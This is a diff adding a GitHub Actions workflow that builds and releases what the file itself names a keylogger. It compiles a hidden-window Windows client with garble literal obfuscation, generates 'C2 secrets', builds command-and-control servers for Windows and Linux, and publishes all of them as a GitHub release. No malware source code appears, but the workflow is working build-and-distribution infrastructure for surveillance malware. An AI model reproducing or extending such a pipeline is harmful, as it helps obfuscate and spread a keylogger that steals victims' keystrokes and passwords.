@@ -1,0 +1,81 @@
+name: build-release
+
+on:
+  push:
+    tags:
+      - 'v*'
+  workflow_dispatch:
+
+permissions:
+  contents: write
+
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Setup Go
+        uses: actions/setup-go@v5
+        with:
+          go-version-file: go.mod
+
+      - name: Install garble
+        run: go install mvdan.cc/garble@latest
+
+      - name: Generate icon, resources and C2 secrets
+        run: |
+          go run gen_icon.go
+          go run gen_resources.go
+          go run ./tools/secretgen
+
+      - name: Build client golin.exe
+        run: |
+          $env:CGO_ENABLED = '0'
+          $ldflags = '-s -w -H windowsgui'
+          $garble = "$(go env GOPATH)\bin\garble.exe"
+          if (Test-Path $garble) {
+            & $garble -tiny -seed=random -literals build -ldflags $ldflags -o golin.exe .
+            if ($LASTEXITCODE -ne 0) {
+              Write-Host "[-] garble failed, falling back to plain go build"
+              go build -trimpath -ldflags $ldflags -o golin.exe .
+            }
+          } else {
+            Write-Host "[-] garble not found, using plain go build"
+            go build -trimpath -ldflags $ldflags -o golin.exe .
+          }
+          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
+
+      - name: Build C2 server (Windows)
+        run: |
+          $env:CGO_ENABLED = '0'
+          go build -trimpath -ldflags "-s -w" -o c2server.exe ./server
+
+      - name: Build C2 server (Linux)
+        run: |
+          $env:CGO_ENABLED = '0'
+          $env:GOOS = 'linux'
+          $env:GOARCH = 'amd64'
+          go build -trimpath -ldflags "-s -w" -o c2server ./server
+
+      - name: Upload build artifacts (manual run)
+        if: ${{ !startsWith(github.ref, 'refs/tags/') }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: golin-keylogger-binaries
+          path: |
+            golin.exe
+            c2server.exe
+            c2server
+          if-no-files-found: error
+
+      - name: Publish GitHub Release (tag push)
+        if: startsWith(github.ref, 'refs/tags/')
+        uses: softprops/action-gh-release@v2
+        with:
+          files: |
+            golin.exe
+            c2server.exe
+            c2server
+          generate_release_notes: true
